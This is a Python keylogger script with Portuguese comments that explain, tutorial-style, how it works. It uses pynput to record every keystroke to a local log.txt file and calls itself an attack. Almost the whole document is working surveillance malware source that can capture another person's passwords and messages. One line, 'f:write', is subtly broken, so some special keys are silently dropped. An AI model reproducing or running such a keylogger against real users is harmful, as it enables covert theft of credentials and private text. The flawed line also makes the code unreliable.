#1. Importando a biblioteca
from pynput import keyboard 

#2. Ignorando teclas que não queremos que sejam salvas no ataque. 
""" Isso ajudará a termos uma leitura mais limpa do conteúdo do arquivo
 """
IGNORAR = {
    keyboard.Key.shift,
    keyboard.Key.shift_r,
    keyboard.Key.ctrl_l,
    keyboard.Key.ctrl_r,
    keyboard.Key.alt_l,
    keyboard.Key.alt_r,
    keyboard.Key.caps_lock,
    keyboard.Key.cmd
}

#3. Função principal do keylogger (on_press)
""" Essa função é chamada automaticamente toda vez que uma tecla for pressionada. Dentro dela utilizamos um try para tentar capturar o caracter da tecla digitada. Se for uma tecla normal como uma letra ou número, o .char vai funcionar e vai escrever o caracter num arquivo chamado log.txt. Como as teclas enter, espaço, backspace, tab e esc não são consideradas caracteres, estamos criando exceções para elas e atribuindo-lhes respostas para que sejamos capazes de identificá-las. No final do código temos a função que "ouve" o teclado e chama a função on_press a cada tecla pressionada. Por fim, a linha final, a listener.join serve para manter o script rodando até que seja interrompido manualmente """

def on_press(key):
    try:
        with open("log.txt", "a", encoding="utf-8") as f:
            f.write(key.char)

    except AttributeError:
        with open("log.txt", "a", encoding="utf-8") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            elif key == keyboard.Key.tab:
                f.write("\t")
            elif key == keyboard.Key.backspace:
                f.write(" ")
            elif key == keyboard.Key.esc:
                f.write(" [ESC] ")
            elif key in IGNORAR:
                pass
            else:
                f:write(f"[{key}]")
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
            

